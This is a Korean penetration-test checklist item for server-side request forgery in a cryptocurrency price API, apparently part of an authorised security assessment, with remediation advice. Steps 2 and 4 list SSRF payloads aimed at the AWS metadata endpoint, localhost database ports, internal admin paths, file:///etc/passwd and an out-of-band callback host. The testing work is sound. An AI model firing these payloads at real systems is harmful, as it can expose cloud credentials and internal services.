================================================================================
[VCE-MARKET-01] 시세 API SSRF → 내부 서버 스캔
도메인: market (코인시세/트렌드)
================================================================================

## 1. 진단 항목 개요

- **항목명**: market 파라미터를 통한 SSRF 시도
- **번호**: MARKET-01
- **위험도**: Medium
- **OWASP**: A10:2021 – Server-Side Request Forgery

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/market/ticker?markets=KRW-BTC |
| 운영 | https://vceapp.com/api/market/ticker?markets=KRW-BTC |
| HTTP 메서드 | GET |
| 인증 요건 | 없음 (공개 API) |

## 3. 취약점 원리 (Why this works)

MarketController가 클라이언트가 전달한 `markets` 파라미터를 업비트 외부 API에 전달할 때,
서버가 해당 값을 검증 없이 외부 요청에 사용하면 SSRF가 가능하다.

백엔드가 업비트 API를 호출하는 URL을 동적으로 구성하는 경우:
```java
String url = "https://api.upbit.com/v1/ticker?markets=" + markets;
```

`markets` 값을 조작하여 내부 서비스로 요청을 보낼 수 있다.
단, 업비트 API URL이 하드코딩되어 있다면 SSRF 가능성이 낮다.

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. Burp Collaborator 준비 (외부 요청 수신용)
2. 정상 시세 API 동작 확인

---

### Step 1. 정상 요청 확인

```
GET /api/market/ticker?markets=KRW-BTC HTTP/1.1
Host: localhost:8080
```

---

### Step 2. markets 파라미터 SSRF 시도

```
GET /api/market/ticker?markets=KRW-BTC,http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /api/market/ticker?markets=http://localhost:3306 HTTP/1.1
GET /api/market/ticker?markets=http://internal-service:8080/admin HTTP/1.1
GET /api/market/ticker?markets=file:///etc/passwd HTTP/1.1
GET /api/market/ticker?markets=KRW-BTC@burp-collaborator.com HTTP/1.1
```

---

### Step 3. 응답에서 내부 정보 노출 확인

오류 응답에 내부 URL이나 스택 트레이스가 포함되는지 확인.

---

### Step 4. candles API 테스트

```
GET /api/market/candles/minutes/1?market=http://169.254.169.254/&count=10 HTTP/1.1
```

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- Burp Collaborator에 인바운드 요청 수신
- 내부 IP (10.x.x.x, 172.16.x.x, 192.168.x.x) 응답 데이터 반환
- AWS 메타데이터 응답 포함

✗ **안전 (Not Vulnerable)**:
- markets 파라미터가 업비트 종목코드 형식만 허용 (KRW-BTC 등)
- 허용 도메인(api.upbit.com)만 요청 가능

## 6. 예상 취약 포인트 (코드 위치)

- `MarketService.java` 또는 `UpbitQuotationService.java` — markets 파라미터 사용 방식

## 7. 권고 조치

- markets 파라미터 입력값 검증: 정규식 `^[A-Z]+-[A-Z]+$`
- 허용 종목 화이트리스트 사전 정의
- 외부 HTTP 클라이언트의 허용 도메인 제한 (api.upbit.com만)
